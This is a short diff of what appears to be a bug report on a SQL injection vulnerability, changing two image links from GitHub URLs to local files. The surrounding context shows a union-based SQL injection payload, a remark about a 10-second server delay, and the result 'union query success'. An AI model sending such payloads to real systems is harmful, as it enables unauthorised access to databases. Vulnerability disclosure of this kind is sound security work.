@@ -27,7 +27,7 @@ Connection: close
 
 The server's response time is 10 seconds
 
-![image](https://github.com/4O4NtFd/bug_report/blob/main/sql1.png)
+![image](./sql1.png)
 
 Payload2:id=-1' union all select null,concat(0x35363738,0x65666768),null,null,null,null-- -
 
@@ -52,4 +52,4 @@ Connection: close
 
 union query success
 
-![image](https://github.com/4O4NtFd/bug_report/blob/main/sql2.png)
+![image](./sql2.png)
